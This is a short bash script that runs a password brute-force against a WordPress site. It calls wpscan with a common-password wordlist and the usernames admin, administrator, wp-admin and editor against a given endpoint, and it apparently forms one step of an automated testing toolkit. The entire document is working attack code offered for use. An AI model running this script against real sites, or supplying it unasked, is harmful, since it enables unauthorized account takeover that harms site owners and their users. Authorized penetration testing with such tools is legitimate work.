#!/bin/bash
# WordPress — XML-RPC multicall brute-force
# Usage: xmlrpc_brute.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
echo "=== WP XML-RPC Brute Force ==="
wpscan --url "$BASE" --passwords /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt \
  --usernames admin,administrator,wp-admin,editor \
  --max-threads 4 --no-banner 2>/dev/null | tail -30
echo "WP_BRUTE_DONE"
